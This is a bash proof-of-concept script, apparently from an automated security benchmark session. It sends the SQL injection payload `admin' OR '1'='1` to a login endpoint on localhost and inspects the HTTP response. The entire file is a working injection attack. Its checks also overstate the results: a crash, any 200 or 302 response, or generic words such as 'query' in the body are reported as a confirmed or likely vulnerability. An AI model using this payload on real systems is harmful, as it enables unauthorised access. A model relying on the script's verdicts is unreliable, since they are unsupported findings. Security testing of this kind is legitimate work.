#!/bin/bash
# POC: SQL Injection in login username field causing application crash via unparameterized query execution
# Target: ./repo
# Created: 2025-11-07T16:18:45.607Z
# Session: benchmark-XBEN-023-24-mhp1zrww

# SQL Injection POC - Login Username Field
# This script demonstrates SQL injection vulnerability in the login endpoint
# by sending a malicious SQL payload that causes application crash

TARGET_URL="http://localhost:5000/login"
TIMEOUT=5

echo "[*] SQL Injection POC - Login Username Field"
echo "[*] Target: $TARGET_URL"
echo "[*] Testing with SQL injection payload: admin' OR '1'='1"
echo ""

# Send SQL injection payload
echo "[*] Sending SQL injection payload..."
RESPONSE=$(curl -s -X POST \
  "$TARGET_URL" \
  -d "username=admin' OR '1'='1&password=test" \
  -w "\n%{http_code}" \
  --max-time $TIMEOUT \
  2>&1)

# Parse response and HTTP code
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "[*] HTTP Response Code: $HTTP_CODE"
echo ""

# Check for vulnerability indicators
if [[ "$HTTP_CODE" == "000" ]] || [[ -z "$HTTP_CODE" ]]; then
  echo "[+] VULNERABILITY CONFIRMED: Application crashed or no response received"
  echo "[+] Indicates unparameterized SQL query execution"
  echo ""
  echo "[*] Response details:"
  echo "$BODY"
  exit 0
fi

# Check for SQL error messages
if echo "$BODY" | grep -qi "SQL\|syntax\|mysql\|postgres\|sqlite\|query\|database"; then
  echo "[+] VULNERABILITY CONFIRMED: SQL error messages detected"
  echo "[+] Application exposing database errors"
  echo ""
  echo "[*] Response details:"
  echo "$BODY"
  exit 0
fi

# Check for successful bypass (non-error responses)
if [[ "$HTTP_CODE" == "200" ]] || [[ "$HTTP_CODE" == "302" ]]; then
  echo "[+] VULNERABILITY LIKELY: Injection succeeded or application unstable"
  echo "[*] Response Code: $HTTP_CODE"
  echo ""
  echo "[*] Response details:"
  echo "$BODY"
  exit 0
fi

echo "[-] No obvious vulnerability indicators detected"
echo "[*] Response: $BODY"
exit 1